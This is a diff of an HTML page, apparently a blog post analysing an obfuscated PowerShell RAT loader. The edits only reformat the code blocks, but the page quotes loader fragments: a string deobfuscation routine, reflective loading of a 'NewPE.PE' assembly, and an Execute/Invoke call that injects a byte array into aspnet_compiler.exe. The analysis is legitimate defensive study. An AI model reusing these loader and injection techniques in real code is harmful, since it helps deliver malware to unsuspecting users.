@@ -74,7 +74,8 @@
 
 
 				<p>Script contents</p>
-				<code style="tab-size:2em"><pre>
+				<blockquote>
+				<pre><code style="tab-size:2em">
 		#mY cODER 3LOSH RAT ::::::
 
 		Function HzGaJsAt([String] $JJES367) {
@@ -132,8 +133,9 @@
 
 		} catch { }
 		 } catch { }
+		 		</code>
 				</pre>
-				</code>
+				</blockquote>
 
 				Notable:
 				<ul>
@@ -163,8 +165,9 @@
 
 				<p>The first chunk of code basically calls <code>ToInt32()</code> against chunks of the statically defined variables, post initial <code>Replace()</code> transformations.</p>
 
-				<code style="tab-size:2em">
+				<blockquote>
 				<pre>
+				<code style="tab-size:2em">
 		function ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV {
 				param($Alosh)
 				$Alosh = $Alosh -split '(..)' | ? { $_ }
@@ -175,8 +178,9 @@
 
 		[byte[]]$UUSW23 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $aloooooooo
 		[byte[]]$JESTW3ERH2 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $geGWHZ
-				</pre>
 				</code>
+				</pre>
+				</blockquote>
 
 				<img src="/assets/imgs/1/11.png" width="60%" class="displayFull" />
 
@@ -190,12 +194,14 @@
 
 				<p>Next up the PowerShell, calls replace against two static bit strings before calling <code>HzGaJsAt()</code> against them.</p>
 
+				<blockquote>
 				<code style="tab-size:2em">
 				<pre>
 		$SJEWS4 = (HzGaJsAt("*1***1*1*1111****11**1*1*11***11*111*1*1*111*1***11**1*1".Replace('*','0')))
 		$JDRU32 = (HzGaJsAt("0*00*00*0**0***00***0**00**0****0**0*0**0**00*0*".Replace('*','1')))
 				</pre>
 				</code>
+				</blockquote>
 
 
 				<p>This, iterates over 8 digit chunks, converts them to bytes, and places them on a list, which is eventually converted to a string and returned.</p>
@@ -225,8 +231,9 @@
 				</blockquote>
 
 
-				<code style="tab-size:2em">
-				 <pre>
+				<blockquote>
+				<pre>
+				 <code style="tab-size:2em">
 		 try 
 		{
 		$JRES3E5 = [System.Reflection.Assembly]
@@ -238,8 +245,9 @@
 			$EUS3W3 = $ncrx3.GetType('N' +'e' +'wP' +'E.PE');
 			$EUZW = $EUS3W3.'GetMethod'($SJEWS4);
 			} catch { }
+					</code>
 				</pre>
-				</code>
+				</blockquote>
 
 
 				<img src="/assets/imgs/1/20.png" width="25%" style="margin-left:4%" />
@@ -265,20 +273,24 @@
 				<p>This object allows access to the Image itself (but, I don't know too much about .NET, so take this with a grain of salt).</p>
 				<p>One could for example access its methods as below.</p>
 
-				<code style="tab-size:2em">
+				<blockquote>
 				<pre>
+				<code style="tab-size:2em">
 		$ncrx3.GetType('NewPE.PE').GetMethods()
-				</pre>
 				</code>
+				</pre>
+				</blockquote>
 
 
 				<p>The PowerShell here just obtains a handle to the object's <code>Execute</code> method.</p>
 
-				<code style="tab-size:2em">
+				<blockquote>
 				<pre>
+				<code style="tab-size:2em">
 		$EUZW = $EUS3W3.'GetMethod'('Execute')
-				</pre>
 				</code>
+				</pre>
+				</blockquote>
 
 
 				<p>The assembly's <code>Execute</code> method:</p>
@@ -301,11 +313,13 @@
 
 				<p>Variable <code>$UUSW23</code> contains a sequence of bytes that was populated on line 26. It's essentially what was in the first variable.</p>
 
-				<code style="tab-size:2em">
+				<blockquote>
 				<pre>
+				<code style="tab-size:2em">
 		[byte[]]$UUSW23 = ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV $aloooooooo
-				</pre>
 				</code>
+				</pre>
+				</blockquote>
 
 
 				<p>Variable <code>$EUZW</code> is a handle to the assembly's Execute method and has the property Invoke, which is also what <code>$JDRU32</code> is.</p>
@@ -324,11 +338,13 @@
 				<p>Essentially we can see that the PowerShell <code>(Assembly's).Execute().Invoke().Invoke(NULL, (aspnet_compiler.exe byteArray[]) )</code> is what will be ran.</p>
 
 
-				<code style="tab-size:2em">
+				<blockquote>
 				<pre>
+				<code style="tab-size:2em">
 		$EUZW.$JDRU32.Invoke($null, $SEYEYHHSSSSSSW)
-				</pre>
 				</code>
+				</pre>
+				</blockquote>
 
 
 				<p>The script will execute the contents of <code>$SEYEYHHSSSSSSW</code>, which is the full path to <code>aspnet_compiler.exe</code> along with the byte array set up earlier, as parameter.</p>
